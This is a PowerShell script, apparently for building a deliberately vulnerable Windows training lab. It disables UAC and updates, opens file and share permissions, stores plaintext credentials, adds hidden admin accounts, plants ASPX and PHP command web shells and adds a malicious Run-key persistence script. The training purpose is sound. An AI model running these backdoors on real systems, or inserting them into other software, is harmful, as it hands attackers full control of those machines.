###########################################################################
# EXTREMELY VULNERABLE POWER SHELL SCRIPT                                 #
# WARNING: Use in an isolated lab environment ONLY!                       #
# WARNING: DO NOT use this script on production or connected systems.     #
# WARNING: The vulnerabilities introduced can result in full compromise! #
###########################################################################

Write-Host "Creating an environment with maximum vulnerabilities for educational purposes..." -ForegroundColor Red

# ------------------------------------------------------
# **BEGINNER AND INTERMEDIATE VULNERABILITIES**
# ------------------------------------------------------

# Disable User Access Control (UAC) completely
Write-Host "Disabling User Access Control (UAC)..."
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
Write-Host "UAC has been disabled. All processes now run with administrator privileges."

# Grant "Everyone" group full control on system drives
Write-Host "Granting 'Everyone' group full control to system drives (C:\)..."
icacls C:\ /grant Everyone:F /T /C
if ($?) {
    Write-Host "File system permissions have been weakened. Students must fix these ACLs."
} else {
    Write-Host "Failed to apply permissions. Check the 'icacls' command."
}

# Disable and stop the Windows Update service
Write-Host "Disabling Windows Update service..."
Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 5
Set-Service -Name "wuauserv" -StartupType Disabled
Write-Host "Windows Update has been disabled. Students must re-enable updates to secure the system."

# Enable SMBv1 Protocol (with installation if missing)
Write-Host "Installing and enabling SMBv1 protocol..."
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force
Write-Host "SMBv1 protocol has been enabled for exploitation. Students must remove it."

# Store administrative credentials in plaintext
Write-Host "Storing administrative credentials in plaintext on disk..."
$dirPath = "C:\Temp"
if (!(Test-Path $dirPath)) {
    New-Item -ItemType Directory -Path $dirPath
}
$creds = "Username=Admin;Password=Admin123"
Set-Content -Path "$dirPath\plaintext-creds.txt" -Value $creds
Write-Host "Sensitive credentials have been stored in $dirPath\plaintext-creds.txt."

# Set overly permissive Share permissions
Write-Host "Creating a globally shared folder with inappropriate permissions..."
New-Item -Path "C:\Shared" -ItemType Directory
New-SmbShare -Name "InsecureShare" -Path "C:\Shared" -FullAccess Everyone
Write-Host "A shared folder with full access to 'Everyone' has been created."

# ------------------------------------------------------
# **ADVANCED VULNERABILITIES**
# ------------------------------------------------------

# Create a hidden local administrator account with simple password
Write-Host "Creating a hidden administrator account with a weak password..."
net user HiddenAdmin Admin123! /add
net localgroup administrators HiddenAdmin /add
net user HiddenAdmin /active:yes
Write-Host "Hidden administrator account created with username: 'HiddenAdmin' and password: 'Admin123!'."

# Modify hosts file to redirect security updates to localhost
Write-Host "Modifying system's hosts file to block security updates..."
Add-Content -Path "C:\Windows\System32\Drivers\etc\hosts" -Value "127.0.0.1   update.microsoft.com"
Write-Host "System now blocks access to Microsoft's update servers. Students must fix the hosts file."

# Modify RDP settings to allow unlimited brute-force attempts
Write-Host "Removing security limits on RDP sessions..."
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "MaxOutstandingConnections" -Value 9999
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "MaxIdleTime" -Value 0
Write-Host "RDP limits removed. Brute force attack protections are now disabled."

# Deploy multiple WebShell backdoors
Write-Host "Deploying multiple WebShell backdoors for exploitation..."
New-Item -Path "C:\inetpub\wwwroot\backdoor1" -ItemType Directory
New-Item -Path "C:\inetpub\wwwroot\backdoor2" -ItemType Directory
Set-Content -Path "C:\inetpub\wwwroot\backdoor1\shell.aspx" -Value '<%@ Page Language="C#" Debug="true" %><script runat="server">public void Page_Load() {System.Diagnostics.Process pProcess = new System.Diagnostics.Process();pProcess.StartInfo.FileName = Request.QueryString["cmd"];pProcess.Start();}</script>'
Set-Content -Path "C:\inetpub\wwwroot\backdoor2\shell.php" -Value '<?php echo shell_exec($_REQUEST["cmd"]); ?>'
Write-Host "Backdoor WebShells deployed in C:\inetpub\wwwroot\backdoor1\shell.aspx and C:\inetpub\wwwroot\backdoor2\shell.php."

# Orphan Admin SID in Active Directory (introducing persistence)
Write-Host "Creating an orphaned SID with Admin permissions in Active Directory..."
Import-Module ActiveDirectory
New-ADUser -Name "OrphanUser" -GivenName "Orphan" -Surname "User" `
    -SamAccountName "OrphanUser" -AccountPassword (ConvertTo-SecureString "Pa$$w0rd!" -AsPlainText -Force) `
    -Enabled $true -CannotChangePassword $true -PasswordNeverExpires $true
Remove-ADUser -Identity "OrphanUser" -Confirm:$false
Write-Host "User 'OrphanUser' deleted but its SID remains in AD permissions. Students must detect this orphaned SID."

# Add malicious startup scripts for persistence
Write-Host "Adding malicious startup scripts for persistence..."
mkdir "C:\ProgramData\Malware"
Set-Content -Path "C:\ProgramData\Malware\startup.ps1" -Value "Start-Process -FilePath cmd -ArgumentList '/c net user attacker Attacker123! /add && net localgroup administrators attacker /add'"
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousStartup" -Value "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Malware\startup.ps1"
Write-Host "Malicious startup script added. Students must identify and remove it."

# ------------------------------------------------------
# **FINAL WARNINGS**
# ------------------------------------------------------
Write-Host "The system has been intentionally weakened for educational purposes." -ForegroundColor Yellow
Write-Host "Students should methodically identify and fix each misconfiguration." -ForegroundColor Yellow
Write-Host "Ensure this system is destroyed or reverted after use!" -ForegroundColor Red